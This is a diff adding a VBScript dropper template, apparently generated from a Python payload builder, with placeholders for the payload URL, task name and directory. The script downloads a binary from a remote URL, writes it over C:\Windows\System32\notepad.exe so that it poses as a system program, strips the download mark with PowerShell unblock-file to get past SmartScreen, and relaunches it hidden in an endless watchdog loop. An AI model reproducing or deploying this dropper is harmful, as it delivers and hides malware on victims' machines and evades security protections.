@@ -1,0 +1,111 @@
+
+Dim strDirectory
+Dim strTarget
+Dim strURL
+Dim strTimeout_sec
+Dim strTaskName
+
+strDirectory = "C:\Windows\System32\"
+strTarget = "notepad.exe"
+strURL = "''' + PYL_URL + '''"
+timeout_sec = 10
+strTaskName = "''' + TASK_NAME + '''"
+
+
+Set oShell = CreateObject ("Wscript.Shell")
+Dim cmd0
+cmd0 = strDirectory & strTarget
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+If (fso.FileExists(strDirectory & strTarget)) Then
+    msgbox strDirectory & strTarget & " exists."
+
+Else
+    '------------------------------------------------------------
+    ' Init
+
+    On Error Resume Next
+
+    Sub BuildFullPath(ByVal FullPath)
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        If Not fso.FolderExists(FullPath) Then
+        BuildFullPath fso.GetParentFolderName(FullPath)
+        fso.CreateFolder FullPath
+        End If
+    End Sub
+
+    BuildFullPath "''' + DIRECTORY + '''"
+
+    '------------------------------------------------------------
+    ' Variables
+
+    URL = strURL
+    strFile = strDirectory & strTarget
+    StrTaskName = strTaskName
+
+    '------------------------------------------------------------
+    ' Wget
+
+    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+
+    objXMLHTTP.open "GET", URL, false
+    objXMLHTTP.send()
+
+    If objXMLHTTP.Status = 200 Then
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objADOStream.Open
+    objADOStream.Type = 1 'adTypeBinary
+
+    objADOStream.Write objXMLHTTP.ResponseBody
+    objADOStream.Position = 0    'Set the stream position to the start
+
+    Set objFSO = Createobject("Scripting.FileSystemObject")
+    If objFSO.Fileexists(strDirectory & strTarget) Then objFSO.DeleteFile strDirectory & strTarget
+    Set objFSO = Nothing
+
+    objADOStream.SaveToFile strDirectory & strTarget
+    objADOStream.Close
+    Set objADOStream = Nothing
+    End if
+
+    Set objXMLHTTP = Nothing
+
+    '------------------------------------------------------------
+    ' SmartScreen
+
+    Set oShell = CreateObject ("Wscript.Shell")
+    Dim cmd1
+
+    cmd1 = "powershell.exe -noprofile -command unblock-file -path " & strDirectory & strTarget
+    oShell.Run cmd1, 0, false
+
+
+End If
+
+Do While (True) 
+
+
+    Set objWMIService = GetObject("winmgmts:" _
+        & "{impersonationLevel=impersonate}!\\" & "." & "\root\cimv2")
+    Set colProcessList = objWMIService.ExecQuery _
+        ("Select Name from Win32_Process WHERE Name LIKE '" & strTarget & "%'")
+
+    If colProcessList.count>0 then
+            
+        msgbox strTarget & " is running"
+        
+    else
+        
+        oShell.Run cmd0, 0, false
+        msgbox strTarget & " was not running"
+
+    End if 
+
+    Set objWMIService = Nothing
+    Set colProcessList = Nothing
+
+    WScript.Sleep( strTimeout_sec * 1000 )
+
+Loop
+
+
